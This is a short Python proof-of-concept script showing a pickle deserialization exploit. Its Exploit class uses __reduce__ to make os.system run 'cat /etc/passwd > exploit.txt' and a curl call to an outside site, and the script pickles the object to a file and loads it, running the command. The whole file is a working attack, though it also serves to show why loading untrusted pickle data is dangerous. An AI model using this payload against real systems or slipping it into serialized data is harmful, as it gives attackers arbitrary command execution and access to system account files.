import os
import pickle


class Exploit:
    def __reduce__(self):
        return os.system, ('cat /etc/passwd > exploit.txt ; curl www.google.com >> exploit.txt',)


def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)


def deserialize_exploit(fname):
    with open(fname, 'rb') as f:
        pickle.load(f)


serialize_exploit('loadme')
deserialize_exploit('loadme')
